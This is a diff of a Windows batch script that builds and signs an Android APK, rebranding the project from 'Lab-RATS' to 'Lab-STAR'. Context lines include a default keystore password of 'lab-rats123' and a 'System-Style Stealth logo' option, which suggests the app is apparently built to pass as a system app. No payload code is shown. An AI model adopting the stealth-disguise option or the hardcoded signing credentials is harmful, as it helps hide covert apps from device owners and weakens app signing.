@@ -3,14 +3,14 @@ setlocal EnableDelayedExpansion
 chcp 65001 >nul 2>&1
 
 REM #################################################
-REM          Lab-RATS APK BUILDER - Windows
-REM                   v1.4.5 Hardened
+REM          Lab-STAR APK BUILDER - Windows
+REM                   v1.5.0 Hardened
 REM
-REM  Developed by: Lab-RATS.LABS
-REM  GitHub: https://github.com/K4N3CO-LABS/Lab-RATS
+REM  Developed by: Lab-STAR.LABS
+REM  GitHub: https://github.com/K4N3CO-LABS/Lab-STAR
 #################################################
 
-title Lab-RATS APK Builder v1.4.5 - by Lab-RATS.LABS
+title Lab-STAR APK Builder v1.5.0 - by Lab-STAR.LABS
 
 REM Get script directory
 set "SCRIPT_DIR=%~dp0"
@@ -32,8 +32,8 @@ echo [96m │  ██╔═██╗ ╚════██║██║╚██�
 echo [96m │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │[0m
 echo [96m │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │[0m
 echo [96m │                                                              │[0m
-echo [96m │ PROJECT: Lab-RATS APK Builder | v1.4.5 Hardened              │[0m
-echo [96m │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-RATS           │[0m
+echo [96m │ PROJECT: Lab-STAR APK Builder | v1.5.0 Hardened              │[0m
+echo [96m │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-STAR           │[0m
 echo [96m │                                                              │[0m
 echo [96m └──────────────────────────────────────────────────────────────┘[0m
 echo.
@@ -122,8 +122,8 @@ set "KEYSTORE_PATH=%PROJECT_DIR%\lab-rats-keystore.jks"
 REM Default values
 set "KEY_ALIAS=lab-rats-key"
 set "KEYSTORE_PASS=lab-rats123"
-set "CN_NAME=Lab-RATS Developer"
-set "ORG_NAME=Lab-RATS.LABS"
+set "CN_NAME=Lab-STAR Developer"
+set "ORG_NAME=Lab-STAR.LABS"
 set "COUNTRY=US"
 set "VALIDITY_DAYS=9125"
 
@@ -150,10 +150,10 @@ if not "%AUTO_KEYSTORE%"=="1" (
     if "!KEY_ALIAS!"=="" set "KEY_ALIAS=lab-rats-key"
     set /p "KEYSTORE_PASS=    Keystore password [lab-rats123]: "
     if "!KEYSTORE_PASS!"=="" set "KEYSTORE_PASS=lab-rats123"
-    set /p "CN_NAME=    Your name [Lab-RATS Developer]: "
-    if "!CN_NAME!"=="" set "CN_NAME=Lab-RATS Developer"
-    set /p "ORG_NAME=    Organization [Lab-RATS.LABS]: "
-    if "!ORG_NAME!"=="" set "ORG_NAME=Lab-RATS.LABS"
+    set /p "CN_NAME=    Your name [Lab-STAR Developer]: "
+    if "!CN_NAME!"=="" set "CN_NAME=Lab-STAR Developer"
+    set /p "ORG_NAME=    Organization [Lab-STAR.LABS]: "
+    if "!ORG_NAME!"=="" set "ORG_NAME=Lab-STAR.LABS"
     set /p "COUNTRY=    Country code [US]: "
     if "!COUNTRY!"=="" set "COUNTRY=US"
 ) else (
@@ -203,7 +203,7 @@ set "RES_DIR=%PROJECT_DIR%\app\src\main\res"
 
 echo [95m[^>] Logo options:[0m
 echo     1. Use Recommended System-Style Stealth logo (default_app_icon.png)
-echo     2. Use default Lab-RATS logo (app_logo.png)
+echo     2. Use default Lab-STAR logo (app_logo.png)
 echo     3. Use custom logo (provide image path)
 echo     4. Skip (Keep project icons as is)
 echo.
@@ -223,7 +223,7 @@ if "!LOGO_OPTION!"=="1" (
 ) else if "!LOGO_OPTION!"=="2" (
     if exist "%DEFAULT_LOGO%" (
         set "LOGO_PATH=%DEFAULT_LOGO%"
-        echo [92m[✓] Using default Lab-RATS logo[0m
+        echo [92m[✓] Using default Lab-STAR logo[0m
     ) else (
         echo [91m[!] Default logo not found at: %DEFAULT_LOGO%[0m
         goto :logo_done
@@ -593,7 +593,7 @@ if "!MENU_OPTION!"=="1" (
     call :show_help
 ) else if "!MENU_OPTION!"=="8" (
     echo [96m[*] Goodbye![0m
-    echo [95m    Follow: https://github.com/K4N3CO-LABS/Lab-RATS[0m
+    echo [95m    Follow: https://github.com/K4N3CO-LABS/Lab-STAR[0m
     exit /b 0
 ) else (
     echo [91m[!] Invalid option[0m
@@ -609,7 +609,7 @@ goto :eof
 
 :show_help
 call :print_banner
-echo [97mCOMMAND_DOCUMENTATION_V1.4.5[0m
+echo [97mCOMMAND_DOCUMENTATION_V1.5.0[0m
 echo ------------------------------------------------------------
 echo [96m1. Start Build:[0m Full automated process. Configures everything
 echo    and produces a signed APK ready for installation.
